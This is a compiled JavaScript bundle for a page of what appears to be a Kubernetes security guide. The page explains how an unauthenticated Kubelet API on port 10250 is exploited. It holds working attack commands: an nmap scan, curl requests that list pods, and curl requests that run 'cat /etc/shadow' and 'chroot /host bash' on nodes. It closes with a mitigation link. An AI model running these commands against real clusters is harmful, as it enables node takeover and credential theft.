"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[8263],{4972:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>r,contentTitle:()=>c,default:()=>u,frontMatter:()=>i,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"attack_vectors/exposed_kubelet_api","title":"Exposed Kubelet API","description":"How an exposed Kubelet API can be exploited to execute commands on nodes and compromise Kubernetes clusters.","source":"@site/docs/attack_vectors/exposed_kubelet_api.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/exposed_kubelet_api","permalink":"/docs/attack_vectors/exposed_kubelet_api","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1742774115000,"sidebarPosition":5,"frontMatter":{"sidebar_position":5,"title":"Exposed Kubelet API","description":"How an exposed Kubelet API can be exploited to execute commands on nodes and compromise Kubernetes clusters."},"sidebar":"default","previous":{"title":"Insecure Secrets Management","permalink":"/docs/attack_vectors/insecure_secrets_management"},"next":{"title":"Lack of Network Policies","permalink":"/docs/attack_vectors/lack_of_network_policies"}}');var a=n(4848),o=n(8453);const i={sidebar_position:5,title:"Exposed Kubelet API",description:"How an exposed Kubelet API can be exploited to execute commands on nodes and compromise Kubernetes clusters."},c="Exposed Kubelet API",r={},l=[{value:"Exploitation Steps: Gaining Access to the Kubelet API",id:"exploitation-steps-gaining-access-to-the-kubelet-api",level:2},{value:"1. Scan for Exposed Kubelet Ports",id:"1-scan-for-exposed-kubelet-ports",level:3},{value:"2. Query the Kubelet API",id:"2-query-the-kubelet-api",level:3},{value:"3. Execute Commands in a Container",id:"3-execute-commands-in-a-container",level:3},{value:"4. Escalate to the Host",id:"4-escalate-to-the-host",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2}];function d(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,o.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(t.header,{children:(0,a.jsx)(t.h1,{id:"exposed-kubelet-api",children:"Exposed Kubelet API"})}),"\n",(0,a.jsxs)(t.p,{children:["The ",(0,a.jsx)(t.strong,{children:"Kubelet API"})," manages pods on individual nodes in a Kubernetes cluster. When left exposed and unauthenticated, it allows attackers to execute commands on containers or even the underlying host, putting the entire cluster at risk."]}),"\n",(0,a.jsx)(t.p,{children:"This article demonstrates how attackers discover and exploit insecure Kubelet APIs to gain remote control over nodes and escalate privileges."}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h2,{id:"exploitation-steps-gaining-access-to-the-kubelet-api",children:"Exploitation Steps: Gaining Access to the Kubelet API"}),"\n",(0,a.jsx)(t.h3,{id:"1-scan-for-exposed-kubelet-ports",children:"1. Scan for Exposed Kubelet Ports"}),"\n",(0,a.jsx)(t.p,{children:"Attackers scan the cluster\u2019s IP range for open Kubelet ports (default: 10250):"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"nmap -p 10250 --open <cluster-ip-range>\n"})}),"\n",(0,a.jsx)(t.h3,{id:"2-query-the-kubelet-api",children:"2. Query the Kubelet API"}),"\n",(0,a.jsx)(t.p,{children:"If authentication is not required, the attacker lists all pods on the node:"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"curl -k https://<kubelet-ip>:10250/pods\n"})}),"\n",(0,a.jsx)(t.p,{children:"This reveals metadata and container names that can be used for further exploitation."}),"\n",(0,a.jsx)(t.h3,{id:"3-execute-commands-in-a-container",children:"3. Execute Commands in a Container"}),"\n",(0,a.jsx)(t.p,{children:"If unauthenticated access is allowed, the attacker can run arbitrary commands inside containers:"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"curl -k -X POST \"https://<kubelet-ip>:10250/run/<namespace>/<pod-name>/<container-name>\" -d 'cmd=cat /etc/shadow'\n"})}),"\n",(0,a.jsx)(t.h3,{id:"4-escalate-to-the-host",children:"4. Escalate to the Host"}),"\n",(0,a.jsx)(t.p,{children:"If the container has access to the host filesystem, the attacker can escape the container and access the host:"}),"\n",(0,a.jsx)(t.pre,{children:(0,a.jsx)(t.code,{className:"language-bash",children:"curl -k -X POST \"https://<kubelet-ip>:10250/run/default/root-container\" -d 'cmd=chroot /host bash'\n"})}),"\n",(0,a.jsx)(t.p,{children:"This effectively grants remote root shell access to the worker node."}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h3,{id:"result",children:"Result"}),"\n",(0,a.jsx)(t.p,{children:"Exposing the Kubelet API without authentication or access controls can lead to:"}),"\n",(0,a.jsxs)(t.ul,{children:["\n",(0,a.jsx)(t.li,{children:"Remote command execution inside pods"}),"\n",(0,a.jsx)(t.li,{children:"Exposure of sensitive files and environment data"}),"\n",(0,a.jsx)(t.li,{children:"Host-level access via container escape"}),"\n",(0,a.jsx)(t.li,{children:"Full cluster compromise"}),"\n"]}),"\n",(0,a.jsx)(t.hr,{}),"\n",(0,a.jsx)(t.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,a.jsxs)(t.p,{children:["\u27a1 ",(0,a.jsx)(t.a,{href:"/docs/best_practices/cluster_setup_and_hardening/node_security/kubelet_security",children:"Kubelet Security"})]})]})}function u(e={}){const{wrapper:t}={...(0,o.R)(),...e.components};return t?(0,a.jsx)(t,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},8453:(e,t,n)=>{n.d(t,{R:()=>i,x:()=>c});var s=n(6540);const a={},o=s.createContext(a);function i(e){const t=s.useContext(o);return s.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function c(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),s.createElement(o.Provider,{value:t},e.children)}}}]);